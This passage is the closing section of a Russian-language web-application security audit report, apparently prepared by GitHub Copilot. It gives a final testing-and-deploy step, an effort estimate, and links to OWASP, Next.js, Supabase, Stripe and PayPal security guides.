
### Шаг 5: Тестирование (1-2 часа)
- Протестировать все исправления
- Проверить что ничего не сломалось
- Deploy в production

**Общее время:** ~8-12 часов работы

---

## 📚 ДОПОЛНИТЕЛЬНЫЕ РЕСУРСЫ

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/routing/middleware#security-headers)
- [Supabase RLS Guide](https://supabase.com/docs/guides/auth/row-level-security)
- [Stripe Webhook Security](https://stripe.com/docs/webhooks/best-practices)
- [PayPal Webhook Verification](https://developer.paypal.com/api/rest/webhooks/)

---

**Отчет подготовлен:** 1 декабря 2025  
**Ответственный:** GitHub Copilot  
**Следующий аудит:** После внедрения исправлений
